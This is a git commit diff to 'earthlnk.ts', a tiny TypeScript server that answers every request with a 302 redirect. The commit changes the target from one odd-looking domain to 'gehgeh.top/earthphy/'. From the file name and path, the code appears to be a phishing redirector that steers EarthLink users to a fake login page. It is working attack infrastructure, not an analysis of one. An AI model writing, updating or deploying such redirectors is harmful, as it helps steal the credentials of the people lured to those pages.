68bb66c5fea1493b732cc2ba5d0dd3c2151fbf45
Digital2025001 <bosmichael30@gmail.com>
2025-09-09 14:57:55 -0700

    Update earthlnk.ts

--- earthlnk.ts
+++ earthlnk.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://mecamex.net/Earthl/_+_==", // Replace this with your actual link
+      Location: "https://gehgeh.top/earthphy/", // Replace this with your actual link
     },
   });
 });
